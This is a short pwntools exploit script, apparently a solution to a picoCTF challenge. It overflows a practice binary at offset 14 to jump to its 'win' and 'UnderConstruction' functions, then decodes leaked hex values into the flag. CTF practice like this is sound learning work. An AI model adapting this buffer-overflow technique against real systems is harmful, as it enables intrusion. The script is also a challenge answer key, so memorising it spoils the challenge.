#!usr/bin/python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './vuln'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'info'
host, port = 'saturn.picoctf.net', 62263

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# =========================================================
io = initialize()

# Got manually through cyclic gdb-pwndbg
offset = 14

# flattening  payload here
payload = flat({
    offset: [
        elf.sym['win'],
        elf.sym['UnderConstruction']
    ]
})

# sending payload
io.sendlineafter(b'flag', payload)

leaks = []

for i in range(3):
    io.recvuntil(b': ')
    leaks.append([i for i in io.recvline()[:-1].decode().split(' ')])

info(f'{leaks=}')

flag = ''
for i in range(len(leaks)):    
    for j in range(len(leaks[i])):
        leak = leaks[i][j][2:]
        try:
            leak = leaks[i][j][2:]
            info(f'trying {leak}')
            flag += unhex(leak).decode()
        except BaseException:
            pass

info(f'flag = {flag[::-1]}')

io.interactive()